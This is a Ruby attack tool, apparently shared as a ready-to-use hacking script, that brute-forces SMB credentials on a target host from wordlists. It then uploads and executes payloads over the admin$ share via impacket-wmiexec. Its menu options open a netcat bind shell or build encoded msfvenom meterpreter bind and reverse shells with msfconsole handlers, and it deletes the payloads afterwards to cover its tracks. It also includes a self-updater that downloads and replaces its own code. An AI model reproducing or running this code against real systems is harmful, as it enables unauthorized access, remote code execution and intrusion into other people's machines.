#!/usr/bin/env ruby

require 'ruby_smb'
require 'socket'
require 'open-uri'
require 'net/http'
require 'http'

Version = "3.5"

class BruteforceSmb
  @@user = ""
  @@pass = ""

  #  This method is check for the update
  def check_update()
    "[*] Checking for update ...\n".each_char.map {|c| print c;sleep(0.033)}
    puts "[+] Current version #{Version} ..."
    update_server = "https://some.update.server/"
    update_info   = "version.txt"

    puts "[*] Connecting to the update server ..."
    begin
    res = HTTP.get(update_server+update_info)
    if res and res.code == 200
      puts "[+] Connected into update server ..."
      new_version = res.body.to_s.strip
      if new_version > Version
        puts "[*] New version #{new_version} is detected ..."
        update_file   = "update#{new_version}.rb"
        print "[?] Do you want to update ? [Y]yes|[N]no: "

        #update = gets.chomp
        update = $stdin.gets.chomp
        case update
        when /Y|y|yes|O|OK|ok/
          URI.open(update_server+update_file) do |f|
            filename = (update_server + update_file).split('/').last              # g0t last filename
            File.open(filename,'wb') do |file|
              puts "[*] Fetching the update #{filename} [#{f.size}] bytes ..."
              file.write(f.read)                    # Write file to the disk
              puts "\e[32;1m[+]\e[0m Downloding File #{filename} OK ..." if f.size > 0
              puts "[*] Cleaning up old file OK ..." if File.delete($0)
              start_new(filename)
            end
          end
        else
          puts "[i] Update canceled, see next time ..."
        end

      else
        puts "[*] Current version #{res.body.to_s.strip} is updated ..."
      end
    end
    rescue Exception => e
      puts "[*] #{e.message}"
      #puts "[x] Could not connect update server ..."
      print "[?] Do you want continue ([Yes]y|[No]n) ? "
      ok = $stdin.gets.chomp
      return true if ok == "yes" or ok =='Yes' or ok =='y'
      exit
    end
    sleep(1)
  end

  def start_new(filename)
    puts "[*] Rerun new version with ruby #{filename} ..."
    #%x(ruby #{filename})
    #Thread.exit
    Process.exit!
    Process.kill("SIGKILL",$$)
  end

  def scan_smb(rhost, rport=445)
    puts "[*] Scanning the target SMB ..."
    s = Socket.new :INET, :STREAM, 0
    addr = Socket.pack_sockaddr_in(rport, rhost)
    begin
      ret = s.connect(addr)
      if ret
        puts "\e[32;1m[+]\e[0m #{rhost}:#{rport} - TCP OPEN -"
        return true
      else
        puts "[!] #{rhost}:#{rport} - Closed -"
        return false
      end
    rescue Exception => e
      puts "[*] #{e.message}"
    ensure
      s.close
    end
    return ret
  end

  def bruteforce_smb(rhost, rport=445,share='admin$')
    # Scaning the target port ##
    puts "*" * 60
    ret = scan_smb(rhost,rport)
    if ret.class == NilClass
      puts "\e[31;1m[-]\e[0m The target port #{rport}    - Closed - \n"
      Thread.exit
      Process.exit!
      puts "*" * 60
      exit(-1)
    end
    puts "*" * 60
    sleep(0.5)

    "[*] Trying Connect to the target: \e[32;4msmb://#{rhost}/#{share}\e[0m ...\n".each_char {|c| print c;sleep(0.033)}
    counter = 0
    start_time = Time.now

    File.open('userfile.txt').read.lines do |user|
      File.open('password.txt').read.lines do |pass|
        @@user = user.strip
        @@pass = pass.strip
        begin
          sock = TCPSocket.new(rhost, rport)
          dispatcher = RubySMB::Dispatcher::Socket.new(sock)
          client = RubySMB::Client.new(dispatcher, username: @@user, password: @@pass)
          client.negotiate
          client.authenticate
          counter += 1

          puts "[*] Bruteforce  #{rhost} => #{@@user}:#{@@pass}"
          if (client.authenticate.to_s =~ /0x\d+/)
            puts "\e[32;2m[+]\e[0m Success login with \e[31;1m#{@@user}:#{@@pass}\e[0m\n"
            puts "[*] Atack #{counter} times. Spend #{(Time.now - start_time).to_f} seconds."
            break
          end
        rescue
        ensure
          sock.close
        end
      end
    end

    show_menu()
    input = $stdin.gets.chomp
    case input

    when /0/
      filename = generat_filename(filename)  + '.bat'
      puts "[*] Generating the random file #{filename} ... "

      ##  You can use some other command for your self ##
      cmd = "whoami"
      File.write(filename,"cmd /c chcp 65001 && #{cmd}" + "\n",mode:"w")
      exec_bat_cmd(rhost, @@user, @@pass, filename, share)

    when /1/
      filename = "nc.exe"
      puts "[*] Generating the netcat file #{filename} for uploading ... "
      get_shell(rhost,@@user,@@pass,filename,share)

    when /2/
      ## Generat, upload, execute ##
      filename = generat_filename(filename) + '.exe'
      puts "[*] Generating the MSF(bind_shell) #{filename} for uploading ... "
      port = generat_port(port)
      msf_bind_shell = "msfvenom -p windows/meterpreter/bind_tcp RHOST=#{rhost} LPORT=#{port} -e x86/shikata_ga_nai -f exe -o #{filename} 2>/dev/null"
      #puts msf_bind_shell
      system(msf_bind_shell)
      puts "[+] Generating the MSF(bind_shell) #{filename} OK ... "
      upload_file(rhost, @@user, @@pass, filename, share)
      call_msfbind_shell(rhost,@@user,@@pass,filename,share,port)

    when /3/
      filename = generat_filename(filename) + '.exe'
      puts "[*] Generating the MSF(reverse_shell) #{filename} for uploading ... "
      port = generat_port(port)
      msf_reverse_shell = "msfvenom -p windows/meterpreter/reverse_tcp LHOST=#{`hostname -I`.strip} LPORT=#{port} -e x86/shikata_ga_nai -f exe -o #{filename} 2>/dev/null"
      #puts msf_reverse_shell
      system(msf_reverse_shell)
      puts "[+] Generating the MSF(reverse_shell) #{filename} OK ... "
      upload_file(rhost, @@user, @@pass, filename, share)
      call_msfreverse_shell(rhost,@@user,@@pass,filename,share,port)

    else
      puts "[*] Select ERROR ...  "
    end
  end

  def call_msfbind_shell(rhost,user,pass,filename,share,port)
    ## exec cmd ##
    execute_cmd(rhost, user, pass, filename, share)
    puts "[*] Starting msfconsole ..."
    bind_shell = %x(urxvt -e msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/bind_tcp;set RHOST #{rhost};set LPORT #{port};run")
    puts "[+] Getting the shell ... OK" if bind_shell
    #system(bind_shell)
    puts "[*] Removing payload file #{filename} ... OK " if File.delete(filename)
    clean_up(rhost, user, pass, filename, share)
  end

  def call_msfreverse_shell(rhost,user,pass,filename,share,port)
    ## exec cmd ##
    execute_cmd(rhost, user, pass, filename, share)
    puts "[*] Starting msfconsole ..."
    reverse_shell = %x(urxvt -e msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST #{`hostname -I`.strip};set LPORT #{port};run")
    puts "[+] Getting the shell ... OK" if reverse_shell
    #system(bind_shell)
    puts "[*] Removing payload file #{filename} ... OK " if File.delete(filename)
    clean_up(rhost, user, pass, filename, share)
  end

  def generat_port(rport)
    rport = (5000..10000).to_a.shuffle[1]
  end

  def generat_filename(filename)
    filename = ('A'..'Z').to_a.shuffle[1,4].join + (0..9).to_a.shuffle[1,4].join + ('a'..'z').to_a.shuffle[1,4].join # + '.bat'
  end

  def show_menu
    puts ""
    puts "\e[32;2m[+]\e[0m Connected into the target server ..."
    puts "*" * 60
    puts "[*] 0x0: Use random string batch file with .bat exec command"
    puts "[*] 0x1: Use netcat get bind_shell"
    puts "[*] 0x2: Use msfvenom get bind_shell"
    puts "[*] 0x3: Use msfvenom get reverse_shell"
    puts "*" * 60
    puts ""
    print "Select [0-3]: "
  end

  def execute_cmd(rhost, user, pass, filename, share)
    begin
      puts "[*] Executing remote command #{filename}..."
      shell ="impacket-wmiexec #{user}:#{pass}@#{rhost} \"#{filename}\" 2>/dev/null &"             # like windows wmic command
      ret = system(shell)
      puts "[*] Command execute OK ...\n"  if ret
      return false
    rescue Exception => e
      puts e.message
    end
    return true
  end

  def exec_bat_cmd(rhost, user, pass, filename, share)
    begin
      # upload the batch file to the target ..
      upload_file(rhost, user, pass, filename, share)
      execute_cmd(rhost, user, pass, filename, share)
      # Clean the file ...
      sleep(2.5)
      clean_up(rhost, user, pass, filename, share)
      puts "[*] Removing locate file #{filename} ... OK " if File.delete(filename)
    rescue Exception => e
      puts "Error:#{e.message}"
    end
    puts ""
  end

  def clean_up(rhost, user, pass, filename, share)
    begin
      puts "[*] Cleaning up the payload ..."
      cmd = %x(smbclient //#{rhost}/#{share} -U #{user} #{pass} -c "rm #{filename}")
      system(cmd)
      puts "\e[32;2m[+]\e[0m Cleaning up payload \e[32;1m#{filename}\e[0m OK ...\n" if cmd
      return false
    rescue Exception => e
      puts e.message
    end
    return true
  end

  def upload_file(rhost, user, pass, filename, share)
    begin
      # upload payload into remote server #
      "[*] Uploading the payload \e[32;1m#{filename}\e[0m => //#{rhost}/#{share}/#{filename}...\n".each_char {|c| print c;sleep(0.033)}
      #cmd =  "smbclient //#{rhost}/#{share}$ -U #{user} #{pass} -c \"put #{filename}\""
      cmd = %x(smbclient //#{rhost}/#{share} -U #{user} #{pass} -c "put #{filename}" 2>/dev/null)
      system(cmd)
      puts "\e[32;2m[+]\e[0m Uploading payload \e[32;1m#{filename}\e[0m OK ...\n" if cmd
      return false
    rescue Exception => e
      puts e.message
    end
    return true
  end

  def get_shell(rhost, user, pass, filename, share)
    begin
      upload_file(rhost, user, pass, filename, share)
      #getshell
      begin
        rport = 8888
        nc_cmd = "cmd /c chcp 65001 && nc -e cmd -l -p #{rport}"
        #nc_cmd = "cmd /c whoami"

        #shell ="impacket-wmiexec #{user}:#{pass}@#{rhost} \"#{nc_cmd}\""                          # like windows wmic command
        shell ="impacket-wmiexec #{user}:#{pass}@#{rhost} \"#{nc_cmd}\" 2>/dev/null &"             # like windows wmic command
        #shell ="wmic /node:#{rhost} /user:#{user} /password:#{pass} #{filename}"
        #shell = %x(winexe --system --user=#{user}%#{pass} //#{rhost} "#{nc_cmd}")

        ret = system(shell)
        if ret
          puts "[*] Command execute OK ...\n"
          puts "[*] Getting remote shell, plz wait few second ..."
        else
          puts "\e[31;1m[!]\e[0m Error for execute ...\n"
        end
      rescue Exception => e
        puts e.message
      end

      # Getshell and clean the file #
      exploit(rhost,rport)
      clean_up(rhost, user, pass, filename, share)
    rescue Exception => e
      puts "Error:#{e.message}"
    end
    puts ""
  end

  def exploit(rhost, rport)
    puts "-=+-+=-" * 6
    puts "[*] Waiting for the shell ..."
    sleep(3)
    puts "[+] g0t the shell :)"
    puts "-=+-+=-" * 6
    cmd = %x(xterm -e nc #{rhost} #{rport})
    system(cmd)
  end
end

def banner
 showbanner = %Q{
      / \\------------------------------------~o~
      \\_|                                     |
        |   \033[31;1mGet remote smb shell (ver:#{Version})\033[0m    |
        |     -------------------------------~o~
        |      Mail: g0tccc@gmail.com         |
        |      BY:   \033[32;5mp0w3erOff                \033[0m|
        \\____________________________________~o~
      }

 showbanner.each_char.map {|c| print c;sleep(0.0002)}
  puts ""
end


if ARGV.empty? || ARGV.length < 0
  "[*]  Usage: #{$0} {rhost} [rport|rshare].\n".each_char.map {|c| print c;sleep(0.018)}
  puts "example 1: ruby #{__FILE__} 192.168.1.10"
  puts "example 2: ruby #{__FILE__} 192.168.1.10 445 admin$"
  exit(-1)
end

banner

rhost = ARGV[0] || ""
rport = ARGV[1] || "445"
share = ARGV[2] || "admin$"

#BruteforceSmb.new.bruteforce_smb(rhost,rport,share)
brute = BruteforceSmb.new
brute.check_update()

t = Thread.new{brute.bruteforce_smb(rhost,rport,share)}
t.join
